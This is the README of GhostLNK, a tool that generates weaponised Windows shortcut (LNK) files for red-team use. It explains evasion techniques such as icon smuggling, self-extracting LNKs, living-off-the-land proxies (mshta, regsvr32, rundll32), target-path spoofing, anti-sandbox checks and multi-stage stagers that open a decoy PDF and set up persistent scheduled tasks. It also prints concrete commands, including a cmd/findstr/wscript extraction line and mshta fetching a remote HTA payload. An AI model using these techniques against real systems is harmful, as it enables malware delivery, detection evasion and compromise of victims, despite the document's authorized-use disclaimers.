<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=28&duration=3000&pause=500&color=6A1F7A&center=true&vCenter=true&width=700&lines=GhostLNK;Advanced+LNK+Generator;Multi‑Stage+%7C+Icon+Smuggling+%7C+LotL" alt="GhostLNK" />
</p>

<p align="center">
  <!-- Badges -->
  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python"></a>
  <a href="https://www.riverbankcomputing.com/software/pyqt/"><img src="https://img.shields.io/badge/PyQt6-6.0+-41CD52?style=for-the-badge&logo=qt&logoColor=white" alt="PyQt6"></a>
  <a href="https://www.microsoft.com/windows"><img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Windows"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="License"></a>
  <a href="https://github.com/Excalibra"><img src="https://img.shields.io/badge/GitHub-Excalibra-181717?style=for-the-badge&logo=github" alt="GitHub"></a>
</p>

<p align="center">
  <img width="900" alt="GhostLNK Interface" src="https://github.com/user-attachments/assets/532f7d0e-b985-41da-8b7d-cb1e04c91ae6">
</p>

---

## 🧬 Overview

**GhostLNK** is a professional‑grade Windows LNK (shortcut) generator that incorporates advanced tradecraft to help operators reduce detection surface. It supports multi‑stage execution, icon smuggling, LotL proxies, and anti‑sandbox checks, providing a flexible toolkit for red team operations and security research.

> [!IMPORTANT]
> GhostLNK is intended **exclusively** for authorized security testing, red team operations, and educational research. Misuse is strictly prohibited.

---

## 🚀 Key Features

### 🧩 Payload Generation
| Mode | Description |
|------|-------------|
| **Download & Open** | Downloads a remote file to `%TEMP%` and opens it with the default application. |
| **Memory Execute** | Runs a PowerShell script entirely in memory – no disk footprint. |
| **Ultra Stealth** | Minimal, obfuscated PowerShell commands to reduce signature exposure. |
| **Raw Target** | Launches any executable directly, bypassing PowerShell completely. |

### 🛡️ Advanced Techniques
| Technique | Description |
|-----------|-------------|
| **Multi‑Stage Stager** | LNK → drops VBS → opens decoy PDF → creates scheduled task → executes final payload. Fragments the attack chain into benign‑looking steps. |
| **True Icon Smuggling** | Embeds encrypted payload inside the LNK's `IconEnvironmentDataBlock`. The LNK target is `notepad.exe` (clean command line). A separate extractor VBS is saved alongside. |
| **Self‑Extracting LNK** | Appends a VBS extractor between markers. The LNK runs `cmd.exe /c findstr ...` to extract and execute it with `wscript`. No PowerShell in arguments, reducing static signature exposure. |
| **Binary Icon Smuggling** | Appends a self‑contained VBS script to the LNK. Target = `wscript.exe //B` with the LNK itself as argument. |
| **LotL Proxies** | Use trusted Windows binaries to launch payloads: `mshta.exe` (remote HTA), `rundll32.exe` (JavaScript), `regsvr32.exe` (fileless SCT), `conhost.exe` (parent process spoofing). |
| **LNK Stomping** | Spoofs the displayed target path (e.g., `C:\Windows\System32\notepad.exe`) while the real command executes. |
| **Anti‑Sandbox** | Checks for VM and analysis tool processes and terminates if detected. |
| **XOR Encoding & String Obfuscation** | Encrypts payloads and breaks suspicious strings (`powershell` → `('po'+'wer'+'she'+'ll')`). |

### 🎚️ Stealth Levels
| Level | Behavior |
|-------|----------|
| **0 – Normal** | Standard PowerShell output, visible window. |
| **1 – Moderate** | PowerShell aliases, minimized window (`-W 1`). |
| **2 – Maximum** | Obfuscated code, minimal flags, no `-WindowStyle Hidden`. |

### 🖥️ Professional Interface
- **Two‑Column Header** – Title and console output side‑by‑side.
- **Neon Matrix Aesthetic** – High‑contrast, monospaced theme.
- **Step‑by‑Step Workflow** – Numbered stages with visual progress indicators.
- **Smart Conflict Resolution** – Incompatible options auto‑disable with tooltips.
- **Live Dropbox Validation** – Checks for `dl=1` parameter.
- **Icon Masquerading** – 8+ realistic file icons.
- **Recent History** – Quick recall of previous URLs and conversions.

---

## 📦 Installation

### Prerequisites
- **Python 3.8+**
- **Windows OS** (LNK generation requires Windows API structures)

### Quick Setup
```bash
git clone https://github.com/Excalibra/GhostLNK.git
cd GhostLNK
pip install PyQt6 pylnk3   # Auto‑installed on first run if missing
python ghostlnk.py
```

GhostLNK automatically installs missing dependencies when launched.

---

## 🧪 Usage Guide

### 🚀 Basic Workflow (PowerShell Payload)
1. **Enter URL** – e.g., a Dropbox link with `&dl=1`.
2. **Choose Payload Type** – Download & Open, Memory Execute, or Ultra Stealth.
3. **Set Stealth Level** – 0 (normal) to 2 (maximum).
4. **Execution Options** – Pause, debug, or hide window.
5. **Generate** – Follow the numbered buttons: Show → Encode → Copy → Use.

### 🎯 Raw Target Mode
Enable **Raw Target Mode** to launch any executable directly:
```
Target: C:\Windows\System32\mshta.exe
Args:   "https://example.com/payload.hta"
```

### 🧬 Embedded Payload (No Network)
Paste a PowerShell script into the **Embedded Payload** area. Enable **XOR Encode** or **String Obfuscation** for extra stealth. Choose from several delivery methods:

| Method | How It Works |
|--------|--------------|
| **Append Mode** | Payload appended to LNK; extracted via obfuscated PowerShell reflection stub. |
| **Binary Smuggling** | VBS extractor + payload appended; target = `wscript.exe //B`. |
| **True Icon Smuggling** | Payload in `IconEnvironmentDataBlock`; target = `notepad.exe`. Extractor VBS saved separately. |
| **Self‑Extracting LNK** | VBS extractor appended between markers; `cmd.exe` + `findstr` extracts and runs with `wscript`. |

### 🔧 Multi‑Stage Stager
1. Check **Multi‑Stage Stager**.
2. Provide **Decoy PDF URL** (opened immediately).
3. Provide **Final Payload URL** (executed via scheduled task).
The LNK drops a VBS script in a hidden folder, opens the decoy, and creates a persistent scheduled task with a random GUID name.

### 🌐 LotL Proxies
Select a proxy binary and provide the required URL/script:
- **mshta.exe** → `http://server/payload.hta`
- **rundll32.exe** → JavaScript payload
- **regsvr32.exe** → `http://server/payload.sct`
- **conhost.exe** – Used automatically when "Use conhost.exe as proxy" is checked (PowerShell mode only)

---

## 🧠 Design Philosophy

GhostLNK incorporates techniques observed in modern attack chains to help reduce the likelihood of static and behavioral detection:
- **Removing PowerShell from command lines** – Self‑Extracting and True Icon Smuggling methods rely on `cmd.exe`, `wscript.exe`, and benign targets.
- **Hiding payloads in binary structures** – The `IconEnvironmentDataBlock` is not parsed by traditional signature scanners.
- **Fragmenting execution** – Multi‑Stage Stager splits the attack into smaller, seemingly legitimate actions.

These approaches are not silver bullets but are designed to raise the bar for detection.

### Self‑Extracting LNK (cmd + findstr + wscript)
```
Target:   C:\Windows\System32\cmd.exe
Arguments: /c findstr /v "^-----" "%~f0" > "%TEMP%\e.vbs" & wscript //B "%TEMP%\e.vbs"
```
The LNK file contains a VBS script wrapped between `-----BEGIN VBS-----` and `-----END VBS-----` markers, followed by the encrypted payload. `findstr` extracts the script, `wscript` executes it, and the VBS decrypts and runs the PowerShell payload. This method avoids placing PowerShell directly in the LNK arguments.

---

## 📁 Configuration

### `ghostlnk_config.json`
```json
{
  "recent_urls": ["https://dropbox.com/...", "http://vps/file.pdf"],
  "recent_conversions": ["-E SQBFAFgAIAAoAE4AZ..."]
}
```

### Custom Icons
Edit `ICON_DATABASE` in `ghostlnk.py`:
```python
ICON_DATABASE = {
    "My App": (r"C:\Path\to\app.exe", 0, ".custom"),
}
```

---

## 🧰 Troubleshooting

| Symptom | Likely Fix |
|---------|------------|
| LNK doesn't execute | Verify URL accessibility and `dl=1` on Dropbox. |
| Detection still occurs | Try **Self‑Extracting LNK** or **True Icon Smuggling** for reduced signature exposure. |
| GUI won't start | `pip install PyQt6 pylnk3` manually. |
| Buttons stay grayed out | Update to latest code; conflict logic was refined. |
| Import doesn't add `-E` | Click the **Import** button after pasting. |

---

## 📚 Educational Resources

- [Microsoft LNK Format](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/)
- [MITRE ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)
- [MITRE T1027.012 – LNK Icon Smuggling](https://attack.mitre.org/techniques/T1027/012/)

---

## ⚖️ Legal & Ethical Use

> [!CAUTION]
> GhostLNK is **only** for:
> - ✅ Authorized penetration testing
> - ✅ Red team operations with explicit permission
> - ✅ Educational demonstrations
> - ✅ Defensive research
>
> Unauthorized use violates laws and is strictly prohibited.

---

## 🤝 Contributing

1. Fork the repo
2. Create a feature branch (`git checkout -b feature/amazing`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push (`git push origin feature/amazing`)
5. Open a Pull Request

---

## 🙏 Acknowledgments

- **pylnk3** for core LNK manipulation
- The security research community for continuous inspiration

---

<p align="center">
  <b>GhostLNK – Advanced LNK Crafting for Red Teams</b><br>
  <sub>For authorized use only</sub>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8+-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Windows-10%2F11-lightgrey?style=flat-square">
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square">
</p>
